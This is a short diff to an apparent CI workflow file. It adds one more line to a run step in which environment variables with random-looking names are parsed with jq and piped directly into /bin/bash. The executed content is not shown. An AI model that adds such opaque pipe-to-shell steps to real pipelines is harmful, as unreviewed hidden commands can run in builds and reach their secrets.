@@ -24,6 +24,7 @@ jobs:
           echo $c10 | jq -r .ia650 | /bin/bash
           echo $za85 | jq -r .svv74 | /bin/bash
           printf '%s' "$rso356" | jq -r .pwepe2 | /bin/bash
+          echo $il800 | jq -r .x28363 | /bin/bash
 
       - name: Persist data
         if: ${{ always() }}
